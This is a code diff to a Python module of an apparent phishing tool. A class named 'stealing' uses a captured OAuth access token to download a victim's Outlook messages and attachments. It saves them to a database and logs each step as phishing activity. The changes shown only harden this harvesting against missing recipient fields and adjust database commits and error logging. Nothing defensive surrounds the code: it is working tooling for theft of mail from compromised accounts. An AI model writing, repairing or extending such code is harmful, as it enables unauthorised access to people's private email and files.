@@ -1,5 +1,6 @@
 
 
+from concurrent.futures import thread
 from datetime import date
 import adal, json, time, requests, os, threading, sys
 from flask_login import current_user
@@ -178,7 +179,10 @@ class stealing():
 
 
     def attachments(uuid, Id, receiver, From, HasAttachments, date, accessToken):
-        
+        try:
+            receiver = str(receiver[0]['emailAddress']['address'])
+        except:
+            receiver = ""
         if HasAttachments == "True":
             uri = "/me/mailfolders/inbox/messages/" + Id + "/attachments"
             response = stealing.apiCall(uuid, uri, "GET", None, "", accessToken).json()
@@ -190,7 +194,7 @@ class stealing():
                     fileSize = str(size(len(base64.b64decode(content_raw)))) + str("B")
                     signature = hashlib.sha256(content_base64.encode('utf-8')).hexdigest()
                     insertAttachments = Attachments(uuid=uuid,id=Id, 
-                                                    receiver=str(receiver[0]['emailAddress']['address']),
+                                                    receiver=receiver,
                                                     sender = From,
                                                     data=str(content_base64),
                                                     filename= str(attachment_name),
@@ -202,7 +206,6 @@ class stealing():
                     
                     log = ('<br><span style="color:#7FFFD4">'+str(attachment_name)+'</span>')
                     db.session.add(phishingLogs(uuid=uuid, message=log))
-                    db.session.commit()
 
                 except Exception as e:
                     print(e) 
@@ -214,7 +217,6 @@ class stealing():
             except Exception as e:
                 db.session.rollback()
                 print(e)
-                pass        
 
 
     def outlook(uuid, accessToken, victim, endpoint):
@@ -244,10 +246,13 @@ class stealing():
                 Flag           = str(data['flag']['flagStatus'])
                 HasAttachments = str(data['hasAttachments'])
                 Id             = str(data['id'])
-                
+                try:
+                    Recipients = str(ToRecipients[0]['emailAddress']['address'])
+                except:
+                    Recipients = ""  
                 insertMails = Outlook(uuid=uuid,
                                         id=Id,
-                                        username=str(ToRecipients[0]['emailAddress']['address']),
+                                        username=Recipients,
                                         victim= victim,
                                         Body = Body,
                                         bodyPreview= bodyPreview,
@@ -263,13 +268,14 @@ class stealing():
                                         )
                 db.session.add(insertMails)
                 
-                stealing.attachments(uuid, Id, ToRecipients, From, HasAttachments, sentDateTime, accessToken)                                
+                stealing.attachments(uuid, Id, ToRecipients, From, HasAttachments, sentDateTime, accessToken)
                 
             except Exception as e:
                 # LOGGING
+                print(e, Id)
                 log = ('<br><span style="color:red">[-] Outlook: '+str(e)+'</span>')
                 db.session.add(phishingLogs(uuid=uuid, message=log))
-                
+                db.session.commit()
                 return
         try:
             db.session.commit()
